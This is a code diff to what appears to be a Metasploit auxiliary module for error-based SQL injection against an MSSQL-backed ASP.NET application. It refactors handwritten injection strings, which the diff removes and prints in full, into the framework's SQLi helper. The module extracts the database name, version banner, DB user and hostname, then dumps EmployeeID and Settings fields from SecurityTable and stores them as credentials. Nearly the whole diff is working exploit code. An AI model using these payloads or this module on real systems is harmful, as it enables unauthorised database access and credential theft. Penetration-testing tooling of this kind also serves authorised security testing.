@@ -8,6 +8,7 @@ class MetasploitModule < Msf::Auxiliary
   prepend Msf::Exploit::Remote::AutoCheck
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
+  include Msf::Exploit::SQLi
 
   def initialize(info = {})
     super(
@@ -75,13 +76,8 @@ class MetasploitModule < Msf::Auxiliary
     Rex::Text.rand_text_alpha(len)
   end
 
-  def char_list(string)
-    ('char(' + string.split('').map(&:ord).join(')+char(') + ')').to_s
-  end
-
   def error_info(body)
-    /BQEShowModalAlert\('Information','(?<error>[^']+)/ =~ body
-    error
+    body[/BQEShowModalAlert\('Information','([^']+)/, 1]
   end
 
   def inject(content, state, generator, validation)
@@ -127,9 +123,6 @@ class MetasploitModule < Msf::Auxiliary
 
     header = rand_chars
     footer = rand_chars
-    header_char = char_list(header)
-    footer_char = char_list(footer)
-    int = Rex::Text.rand_text_numeric(4)
 
     service = {
       address: rhost,
@@ -140,24 +133,25 @@ class MetasploitModule < Msf::Auxiliary
     }
     report_service(service)
 
-    # all inject strings taken from sqlmap runs, using error page method
-    res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND CHARINDEX(CHAR(49)+CHAR(53)+CHAR(46)+CHAR(48)+CHAR(46),@@VERSION)>0)+'", viewstate, viewstategenerator, eventvalidation)
-    /, table \\u0027(?<table>.+?)\\u0027/ =~ error_info(res)
-    print_good("Current Database: #{table.split('.').first}")
-    report_note(host: rhost, port: rport, type: 'database', data: table.split('.').first)
+    sqli = create_sqli(dbms: Msf::Exploit::SQLi::Mssqli::Common, opts: { safe: true, encoder: { encode: "'#{header}'+^DATA^+'#{footer}'", decode: ->(x) { x[/#{header}(.+?)#{footer}/mi, 1] } } }) do |payload|
+      int = Rex::Text.rand_text_numeric(4)
+      res = inject("'+(select '' where #{int} in (#{payload}))+'", viewstate, viewstategenerator, eventvalidation)
+      err_info = error_info(res)
+      print_error('Unexpected output from the server') if err_info.nil?
+      err_info[/\\u0027(.+?)\\u0027/m, 1]
+    end
 
-    res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND 1325 IN (SELECT (#{header_char}+(SELECT SUBSTRING((ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))),1,1024))+#{footer_char})))+'", viewstate, viewstategenerator, eventvalidation)
-    /\\u0027(?<banner>.+?)\\u0027/ =~ error_info(res)
-    banner.slice!(header)
-    banner.slice!(footer)
-    banner = banner.gsub('\n', "\n").gsub('\t', "\t")
+    # all inject strings taken from sqlmap runs, using error page method
+    database = sqli.current_database
+    print_good("Current Database: #{database}")
+    report_note(host: rhost, port: rport, type: 'database', data: database)
+
+    banner = sqli.version.gsub('\n', "\n").gsub('\t', "\t")
     print_good("Banner: #{banner}")
 
-    res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND 8603 IN (SELECT (#{header_char}+(SELECT SUBSTRING((ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32))),1,1024))+#{footer_char})))+'", viewstate, viewstategenerator, eventvalidation)
-    /\\u0027(?<user>.+?)\\u0027/ =~ error_info(res)
-    user.slice!(header)
-    user.slice!(footer)
+    user = sqli.current_user
     print_good("DB User: #{user}")
+
     credential_data = {
       origin_type: :service,
       module_fullname: fullname,
@@ -167,25 +161,15 @@ class MetasploitModule < Msf::Auxiliary
     }.merge(service)
     create_credential(credential_data)
 
-    res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND 7555 IN (SELECT (#{header_char}+(SUBSTRING((ISNULL(CAST(@@SERVERNAME AS NVARCHAR(4000)),CHAR(32))),1,1024))+#{footer_char})))+'", viewstate, viewstategenerator, eventvalidation)
-    /\\u0027(?<hostname>.+?)\\u0027/ =~ error_info(res)
-    hostname.slice!(header)
-    hostname.slice!(footer)
+    hostname = sqli.hostname
     print_good("Hostname: #{hostname}")
 
-    report_host(host: rhost, name: hostname, info: banner.gsub('\n', "\n").gsub('\n', "\n"), os_name: OperatingSystems::WINDOWS)
+    report_host(host: rhost, name: hostname, info: banner, os_name: OperatingSystems::WINDOWS)
 
-    sec_table = "#{table.split('.')[0...-1].join('.')}.SecurityTable"
-
-    # get user count from SecurityTable
-    res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND 8815 IN (SELECT (#{header_char}+(SELECT ISNULL(CAST(COUNT(*) AS NVARCHAR(4000)),CHAR(32)) FROM #{sec_table} WHERE ModuleID=0)+#{footer_char})))+'", viewstate, viewstategenerator, eventvalidation)
-    /\\u0027(?<user_count>.+?)\\u0027/ =~ error_info(res)
-    user_count.slice!(header)
-    user_count.slice!(footer)
-    print_good("User Count in #{sec_table}: #{user_count}")
+    sec_table = sqli.dump_table_fields("#{database}.dbo.SecurityTable", %w[EmployeeID Settings], 'ModuleID=0')
 
     table = Rex::Text::Table.new(
-      'Header' => sec_table,
+      'Header' => "#{database}.dbo.SecurityTable",
       'Indent' => 1,
       'SortIndex' => -1,
       'Columns' =>
@@ -195,22 +179,7 @@ class MetasploitModule < Msf::Auxiliary
       ]
     )
 
-    (1..user_count.to_i).each do |index|
-      # username
-      # select EmployeeID from test.dbo.SecurityTable where ModuleID=0
-      res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND 2292 IN (SELECT (#{header_char}+(SELECT TOP 1 SUBSTRING((ISNULL(CAST(EmployeeID AS NVARCHAR(4000)),CHAR(32))),1,1024) FROM #{sec_table} WHERE ModuleID=0 AND ISNULL(CAST(EmployeeID AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP #{index - 1} ISNULL(CAST(EmployeeID AS NVARCHAR(4000)),CHAR(32)) FROM #{sec_table} WHERE ModuleID=0 ORDER BY EmployeeID) ORDER BY EmployeeID)+#{footer_char})))+'", viewstate, viewstategenerator, eventvalidation)
-      /\\u0027(?<username>.+?)\\u0027/ =~ error_info(res)
-      username.slice!(header)
-      username.slice!(footer)
-      print_good("Username: #{username}")
-
-      # settings
-      # select Settings from test.dbo.SecurityTable where ModuleID=0
-      res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND 7411 IN (SELECT (#{header_char}+(SELECT TOP 1 SUBSTRING((ISNULL(CAST(Settings AS NVARCHAR(4000)),CHAR(32))),1,1024) FROM #{sec_table} WHERE ModuleID=0 AND ISNULL(CAST(EmployeeID AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP #{index - 1} ISNULL(CAST(EmployeeID AS NVARCHAR(4000)),CHAR(32)) FROM #{sec_table} WHERE ModuleID=0 ORDER BY EmployeeID) ORDER BY EmployeeID)+#{footer_char})))+'", viewstate, viewstategenerator, eventvalidation)
-      /\\u0027(?<settings>.+?)\\u0027/ =~ error_info(res)
-      settings.slice!(header)
-      settings.slice!(footer)
-      print_good("User #{username} settings: #{settings}")
+    sec_table.each do |(username, settings)|
       table << [username, settings]
       credential_data = {
         origin_type: :service,
